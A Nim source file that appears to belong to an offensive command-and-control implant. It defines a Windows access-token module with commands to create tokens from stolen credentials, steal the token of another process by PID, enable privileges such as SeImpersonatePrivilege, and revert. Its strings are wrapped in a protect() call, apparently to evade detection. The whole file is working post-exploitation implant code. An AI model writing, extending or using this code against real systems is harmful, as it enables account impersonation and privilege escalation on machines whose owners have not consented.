import ../common/[types, utils]

# Define function prototype
proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult 
proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult 
proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult 
proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult 
proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult 
proc executeDisablePrivilege(ctx: AgentCtx, task: Task): TaskResult 


# Module definition
let module* = Module(
    name: protect("token"), 
    description: protect("Manipulate Windows access tokens."),
    moduleType: MODULE_TOKEN,
    commands: @[
        Command(
            name: protect("make-token"),
            commandType: CMD_MAKE_TOKEN,
            description: protect("Create an access token from username and password."),
            example: protect("make-token LAB\\john Password123!"),
            arguments: @[
                Argument(name: protect("domain\\username"), description: protect("Account domain and username. For impersonating local users, use .\\username."), argumentType: STRING, isRequired: true),
                Argument(name: protect("password"), description: protect("Account password."), argumentType: STRING, isRequired: true),
                Argument(name: protect("logonType"), description: protect("Logon type (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types)."), argumentType: INT, isRequired: false)
            ],
            execute: executeMakeToken
        ),
        Command(
            name: protect("steal-token"),
            commandType: CMD_STEAL_TOKEN,
            description: protect("Steal the primary access token of a remote process."),
            example: protect("steal-token 1234"),
            arguments: @[
                Argument(name: protect("pid"), description: protect("Process ID of the target process."), argumentType: INT, isRequired: true),
            ],
            execute: executeStealToken
        ),
        Command(
            name: protect("rev2self"),
            commandType: CMD_REV2SELF,
            description: protect("Revert to original access token."),
            example: protect("rev2self"),
            arguments: @[],
            execute: executeRev2Self
        ),
        Command(
            name: protect("token-info"),
            commandType: CMD_TOKEN_INFO,
            description: protect("Retrieve information about the current access token."),
            example: protect("token-info"),
            arguments: @[],
            execute: executeTokenInfo
        ),
        Command(
            name: protect("enable-privilege"),
            commandType: CMD_ENABLE_PRIV,
            description: protect("Enable a token privilege."),
            example: protect("enable-privilege SeImpersonatePrivilege"),
            arguments: @[
                Argument(name: protect("privilege"), description: protect("Privilege to enable."), argumentType: STRING, isRequired: true)
            ],
            execute: executeEnablePrivilege
        ),
        Command(
            name: protect("disable-privilege"),
            commandType: CMD_DISABLE_PRIV,
            description: protect("Disable a token privilege."),
            example: protect("disable-privilege SeImpersonatePrivilege"),
            arguments: @[
                Argument(name: protect("privilege"), description: protect("Privilege to disable."), argumentType: STRING, isRequired: true)
            ],
            execute: executeDisablePrivilege
        )
    ]
)  

# Implement execution functions
when not defined(agent):
    proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult = nil 
    proc executeDisablePrivilege(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import winim, strutils, strformat
    import ../agent/core/token
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../common/utils
    
    proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult =  
        try: 
            print fmt"   [>] Creating access token from username and password."
            
            var logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS
            var  
                username = Bytes.toString(task.args[0].data)
                password = Bytes.toString(task.args[1].data)
        
            # Split username and domain at separator '\'
            let userParts = username.split("\\", 1)
            if userParts.len() != 2: 
                raise newException(CatchableError, protect("Expected format domain\\username."))
            
            if task.argCount == 3: 
                logonType = cast[DWORD](Bytes.toUint32(task.args[2].data))
            
            let impersonationUser  = makeToken(userParts[1], password, userParts[0], logonType)
            if logonType != LOGON32_LOGON_NEW_CREDENTIALS:
                username = impersonationUser
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    proc executeStealToken(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Stealing access token."

            let pid = int(Bytes.toUint32(task.args[0].data))       
            let username  = stealToken(pid)

            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Reverting access token."
            rev2self()
            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Retrieving token information."
            let tokenInfo = getCurrentToken().getTokenInfo() 
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Enabling token privilege."
            let privilege = Bytes.toString(task.args[0].data)            
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege)))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))

    proc executeDisablePrivilege(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print fmt"   [>] Disabling token privilege."
            let privilege = Bytes.toString(task.args[0].data)            
            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege, false)))

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
